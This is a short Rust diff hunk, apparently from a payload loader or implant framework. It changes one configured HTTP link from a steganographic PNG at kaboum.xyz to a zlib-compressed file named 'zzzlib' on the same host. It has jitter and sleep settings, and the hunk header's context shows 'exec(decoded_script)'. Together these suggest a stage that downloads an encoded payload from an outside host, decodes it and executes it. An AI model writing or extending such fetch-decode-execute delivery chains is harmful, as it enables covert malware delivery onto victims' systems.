@@ -334,8 +334,8 @@ exec(decoded_script)
                             sleep: 0,
                         }),
                         Link::HTTP(HTTPLink {
-                            url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
-                            dataoperation: vec![DataOperation::STEGANO],
+                            url: String::from("https://kaboum.xyz/artdonjon/zzzlib"),
+                            dataoperation: vec![DataOperation::ZLIB],
                             jitt: 0,
                             sleep: 0,
                         }),
